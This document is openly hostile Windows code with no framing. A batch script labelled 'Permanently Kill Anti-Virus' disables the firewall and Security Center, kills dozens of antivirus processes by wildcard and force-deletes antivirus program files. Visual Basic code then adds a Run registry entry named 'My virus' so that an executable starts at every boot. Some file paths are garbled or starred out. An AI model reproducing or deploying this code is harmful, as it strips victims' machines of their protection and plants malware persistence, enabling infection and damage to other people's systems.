
@ echo off
rem Permanently Kill Anti-Virus T0TAL_DZ
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFE************
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
cls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C￼rogram Filesalwils~1avast4*.*
del /Q /F C￼rogram FilesLavasoftAd-awa~1*.exe
del /Q /F C￼rogram Fileskasper~1*.exe
cls
del /Q /F C￼rogram Filestrojan~1*.exe
del /Q /F C￼rogram Filesf-prot95*.dll
del /Q /F C￼rogram Filestbav*.dat
cls
del /Q /F C￼rogram Filesavpersonal*.vdf
del /Q /F C￼rogram FilesNorton~1*.cnt
del /Q /F C￼rogram FilesMcafee*.*
cls
del /Q /F C￼rogram FilesNorton~1Norton~1Norton~3*.*
del /Q /F C￼rogram FilesNorton~1Norton~1speedd~1*.*
del /Q /F C￼rogram FilesNorton~1Norton~1*.*
del /Q /F C￼rogram FilesNorton~1*.*
cls
del /Q /F C￼rogram Filesavgamsr*.exe
del /Q /F C￼rogram Filesavgamsvr*.exe
del /Q /F C￼rogram Filesavgemc*.exe
cls
del /Q /F C￼rogram Filesavgcc*.exe
del /Q /F C￼rogram Filesavgupsvc*.exe
del /Q /F C￼rogram Filesgrisoft
del /Q /F C￼rogram Filesnood32krn*.exe
del /Q /F C￼rogram Filesnood32*.exe
cls
del /Q /F C￼rogram Filesnod32
del /Q /F C￼rogram Filesnood32
del /Q /F C￼rogram Fileskav*.exe
del /Q /F C￼rogram Fileskavmm*.exe
del /Q /F C￼rogram Fileskaspersky*.*
cls
del /Q /F C￼rogram Filesewidoctrl*.exe
del /Q /F C￼rogram Filesguard*.exe
del /Q /F C￼rogram Filesewido*.exe
cls
del /Q /F C￼rogram Filespavprsrv*.exe
del /Q /F C￼rogram Filespavprot*.exe
del /Q /F C￼rogram Filesavengine*.exe
cls
del /Q /F C￼rogram Filesapvxdwin*.exe
del /Q /F C￼rogram Files************proxy*.exe
del /Q /F C￼rogram Filespanda software*.*

Option Explicit

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long

Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long

Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

Private Const REG_SZ = 1

Private Const LOCALMACHINE = &H80000002

Private Sub Command1_Click()

Dim InputValue As String

Dim nBufferKey As Long, nBufferSubKey As Long

RegCreateKey LOCALMACHINE, "SOFTWARE\JPRODUCTIONS", nBufferKey

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

InputValue = "c:\******s\system\Project12.exe"

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

RegSetValueEx nBufferSubKey, "My virus", 0, REG_SZ, InputValue, Len(InputValue)

End Sub